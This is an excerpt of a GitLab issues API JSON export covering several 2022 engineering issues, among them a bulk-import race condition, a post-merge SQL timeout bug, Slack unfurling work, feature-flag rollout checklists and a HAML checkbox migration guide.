BulkImports::ExportRequestWorker. This worker trigger a request to the external source to start generating the NDJSON files of the record that that is being migrated. When receiving the request, the source enqueues other works that eventually creates a BulkImport::Export record for each file that needs to be exported. When source complete the generation of each file, the BulkImport::Export record state is updated to `finished` and the file is associated with the record.\n   \n2. BulkImports::EntityWorker. This worker triggers the pipelines that will extract the data from the source instance. Each pipeline consumes the data from a different resource that can be the GraphQL API, Rest API, or NDJSON files. In the case of NDJSON files, before starting the pipeline, the worker makes a API call to the source to check the status of the exported file. Basically, the worker keep tracking the status of the previous worker `1. BulkImports::ExportRequestWorker`.\n\n### Problem / Race condition\n\nIf the `2. BulkImports::EntityWorker` is executed before the `BulkImport::Export` records being created by the worker `1. BulkImports::ExportRequestWorker`, when the `2. BulkImports::EntityWorker` makes the call to the endpoint `GET /api/v4/groups/#{GROUP_ID}/export_relations/status` to check the status of the exported files, the endpoint returns an empty response because `BulkImport::Export` wasn't created yet and in this situation the `2. BulkImports::EntityWorker` marks the pipeline as failed and the file isn't imported.\n\n### Possible fixes\n\nIn order to fix this issue, empty responses shouldn't set the pipeline as `failed`. Instead the `2. BulkImports::EntityWorker` worker should be re-enqueued until the endpoint returns a response that isn't empty.\n\n### Steps to reproduce\n\nIn order to easily reproduce the problem, we can force the export to take longer to start by adding a `sleep` before the service that starts the process\n\nhttps://gitlab.com/gitlab-org/gitlab/blob/a958ab444d6478f2b6d2a4516d224f0c459471a0/app/workers/bulk_imports/relation_export_worker.rb#L15-20\n\nMake sure to export a group or project that doesn't have BulkImport::Export records. Use the endpoints below to check if the records don't exist\n\n- `GET /api/v4/groups/#{GROUP_ID}/export_relations/status`\n\n- `GET /api/v4/projects/#{PROJECT_ID}/export_relations/status`\n\nThen carry on with the migration of the group or project. \n\nIn the end, it's expected that the final status of the import to be `success`, but some resources won't have been migrated.","state":"closed","created_at":"2022-04-11T21:53:42.184Z","updated_at":"2022-06-14T09:50:25.043Z","closed_at":"2022-05-31T10:28:21.659Z","closed_by":{"id":11165152,"username":"rodrigo.tomonari","name":"Rodrigo

https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\nIf there is a SQL timeout during the `PostMergeService` execution (ie after an MR is Merged), the post merge activities can be interrupted, leaving operations incomplete.\n\nExample: if there is a SQL timeout in closing related issues, the Post Merge operation does not complete successfully, and other operations are not completed or started.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/merge_requests/post_merge_service.rb#L14-38\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\nNot reproducible as it relies on environmental conditions.\n\n1. Merge an MR\n2. If any SQL statements timeout during the `MergeService` `after_merge`, confirm that the Post Merge operations did not complete by checking for `Post merge finished` logged in Kibana for the merge correlation id.\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\nGit Merge operation succeeds, however the `after_merge` operations did not complete.\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\nEither the `after_merge` operations are retried, done asynchronously, or via a transaction to ensure data/state integrity.\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\nPlease see

https://gitlab.com/gitlab-org/gitlab/-/issues/337481 using views made with [Slack Block Kit](https://api.slack.com/block-kit).\n\nAn example of the Slack Block Kit code to make a merge request view is in this comment https://gitlab.com/gitlab-org/gitlab/-/issues/337481/designs/Unfurling_states_-_issues.png#note_730095948.\n\nWe should implement Slack Block Kit views for:\n\n- Issues\n- Merge

Testing\n\nSuggestion:\n*  add higher level unit or request specs that assert the correct response content is being sent to the slack hook for requests from slack. (issue and merge requests)\n* Future state: write e2e tests against Slack app.\n\nConsiderations that may already be considered:\n* Edge cases and empty states - Example: (20 assignees on an issue, or no assignees, long issue or MR titles)\n* Consistency between Slack app / Slash commands\n* For slash commands, consider how a self-hosted instance with relative urls will generate links.\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed?

So the endpoint needs to be very performant. \n\nFor this first iteration, this issue is to prepare the events endpoint and process the [challenge](https://api.slack.com/apis/connections/events-api#the-events-api__subscribing-to-event-types__events-api-request-urls__request-url-configuration--verification), but not process any events yet.

Note, Slack itself does [rate limit](https://api.slack.com/apis/connections/events-api#the-events-api__responding-to-events__rate-limiting) its requests (scoped by workspace) but this is separate.\n\nUpdate: The API rate limit work is in a separate issue https://gitlab.com/gitlab-org/gitlab/-/issues/360749.","state":"closed","created_at":"2022-04-11T01:16:13.515Z","updated_at":"2022-11-22T18:45:05.102Z","closed_at":"2022-05-26T21:35:24.639Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Deliverable","Integration::Slack","backend","devops::manage","feature::addition","group::integrations","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358676","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":2,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358676","notes":"https://gitlab.com/api/v4/projects/278964/issues/358676/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358676/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358676","relative":"#358676","full":"gitlab-org/gitlab#358676"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6389,"epic":{"id":311459,"iid":6389,"title":"Link unfurls","url":"/groups/gitlab-org/-/epics/6389","group_id":9970,"human_readable_end_date":"Jul 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":106378086,"iid":358649,"project_id":278964,"title":"[Feature flag] Rollout of `optimized_followed_users_queries`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [optimized followed users queries](https://gitlab.com/gitlab-org/gitlab/-/issues/346435) on production,\nthat is currently behind the `optimized_followed_users_queries` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: Optimize\n- Most appropriate slack channel to reach out to: `#g_manage_optimize`\n- Best individual to reach out to: `ahegyi`, `euko`\n\n\n## Expectations\n\n### What are we expecting to happen?\n\nDecreased query timings for the dashboard (followed users).\n\n### When is the feature viable?\n\nVerified performance improvement.\n\n### What might happen if this goes wrong?\n\nDB statement timeout.\n\n### What can we monitor to detect problems with this?\n\n\n### What can we check for monitoring production after rollouts?\n\n- https://log.gprd.gitlab.net/app/discover#/?_g=h@e9494ca\u0026_a=h@40278dd\n- https://log.gprd.gitlab.net/goto/93798e60-b687-11ec-b73f-692cc1ae8214\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [ ] Verify that the feature works as expected.

Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-04-09T13:46:30.279Z","updated_at":"2022-07-05T06:59:22.771Z","closed_at":"2022-07-05T06:59:22.738Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam

Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-04-08T15:21:49.870Z","updated_at":"2022-05-24T15:48:56.286Z","closed_at":"2022-05-05T09:50:47.438Z","closed_by":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"labels":["Category:Continuous Integration","Eng-Inter-Dept::Rate Limits","Verify::P1","availability::limit","backend","bug::performance","corrective action","devops::verify","feature flag","feature::addition","group::pipeline execution","missed:14.10","priority::1","section::ops","severity::1","type::bug","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"}],"author":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"type":"ISSUE","assignee":{"id":695467,"username":"fabiopitino","name":"Fabio Pitino","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f0db032076c54065b10b3efdfd175e6c?s=80\u0026d=identicon","web_url":"https://gitlab.com/fabiopitino"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358425","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":26},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"26 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358425","notes":"https://gitlab.com/api/v4/projects/278964/issues/358425/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358425/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358425","relative":"#358425","full":"gitlab-org/gitlab#358425"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106330567,"iid":358413,"project_id":278964,"title":"[Frontend] Create a branch filter component for compliance violations","description":"## Problem to solve\n\nAdd a component that can be used on the compliance report to allow the user to select whether they want to display violations for `All branches` or `All protected branches`.\n\n## Proposed solution\n\n1.

We want to migrate these to the [styled checkboxes](https://design.gitlab.com/components/checkbox) defined in the Pajamas design system.\n\nThere are rails helpers for radios and checkboxes which will generate these styled checkboxes and radio buttons for you. You can read their documentation [here](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/development/fe_guide/haml.md#gitlab-ui-form-builder).\n\n## How to migrate\n\nMigrating `f.check_box` to `f.gitlab_ui_checkbox_component` can be done with the following steps:\n\n1. Change `form_for` to `gitlab_ui_form_for`. Sometimes when dealing with small partials this call to `form_for` instance is actually found in a parent template so you may need to dig around for it.\n2. Change `f.check_box` to `f.gitlab_ui_checkbox_component`.\n3. Remove `f.label` and instead pass the label as the second argument in `f.gitlab_ui_checkbox_component`.\n4. Optionally remove any secondary text for this checkbox and pass it as the `help_text` argument in `f.gitlab_ui_checkbox_component`.\n\n**Notes:**\n\n* If the form helper method for the checkbox you are attempting to migrate is using a `bootstrap_form_for` block (rather than `form_for` or `gitlab_ui_form_for`) this is a special case, and we need to create an issue to migrate away from the `bootstrap_form` gem. Please ping `@mikegreiling` in this issue.\n* Issues are being created for each HAML partial in which `f.check_box` is found. There may be other checkboxes in the same form or page that make sense to migrate within a single merge request. If you work on these, ensure you assign yourself in the issues associated with those other HAML partials as well so that you do not duplicate someone else's work.\n* If this checkbox requires any special QA data attributes or classes, these can be passed in the `checkbox_options` argument.\n\n## Example Migration:\n\n- Before:\n\n  ```haml\n  = form_for @group do |f|\n    .form-group.gl-mb-3\n      .gl-form-checkbox.custom-control.custom-checkbox\n        = f.check_box :prevent_sharing_groups_outside_hierarchy, disabled: !can_change_prevent_sharing_groups_outside_hierarchy?(@group), class: 'custom-control-input'\n        = f.label :prevent_sharing_groups_outside_hierarchy, class: 'custom-control-label' do\n          %span\n            = s_('GroupSettings|Prevent members from sending invitations to groups outside of %{group} and its subgroups.').html_safe % { group: link_to_group(@group) }\n          %p.help-text= prevent_sharing_groups_outside_hierarchy_help_text(@group)\n  ```\n\n- After:\n\n  ```haml\n  = gitlab_ui_form_for @group do |f|\n    .form-group.gl-mb-3\n      = f.gitlab_ui_checkbox_component :prevent_sharing_groups_outside_hierarchy,\n          s_('GroupSettings|Prevent members from sending invitations to groups outside of %{group} and its subgroups.').html_safe % { group: link_to_group(@group) },\n          help_text: prevent_sharing_groups_outside_hierarchy_help_text(@group),\n          checkbox_options: { disabled: !can_change_prevent_sharing_groups_outside_hierarchy?(@group) }\n  ```\n\nYou can also look at [this commit](https://gitlab.com/gitlab-org/gitlab/-/commit/9df3f64aa391854d8e52295b6268b262f35aeb31) for another example migration.","state":"closed","created_at":"2022-04-08T08:09:00.575Z","updated_at":"2022-11-22T18:45:43.961Z","closed_at":"2022-04-19T11:46:44.736Z","closed_by":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"labels":["OKR","SUS::Impacting","Unplanned","component:checkbox","devops::manage","frontend","group::purchase","pajamas::integrate","section::dev","severity::4","type::maintenance","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"}],"author":{"id":636429,"username":"mikegreiling","name":"Mike Greiling","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/636429/avatar.png","web_url":"https://gitlab.com/mikegreiling"},"type":"ISSUE","assignee":{"id":9299375,"username":"dzubova","name":"Diana Zubova","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9299375/avatar.png","web_url":"https://gitlab.com/dzubova"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358343","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358343","notes":"https://gitlab.com/api/v4/projects/278964/issues/358343/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358343/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358343","relative":"#358343","full":"gitlab-org/gitlab#358343"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7878,"epic":{"id":495635,"iid":7878,"title":"Checkboxes \u003e HAML \u003e Migrate check_box form helper to gitlab_ui_checkbox_component","url":"/groups/gitlab-org/-/epics/7878","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106307719,"iid":358296,"project_id":278964,"title":"[Feature flag] Rollout of update_storage_usage_design","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [Usage Quota Standardization -
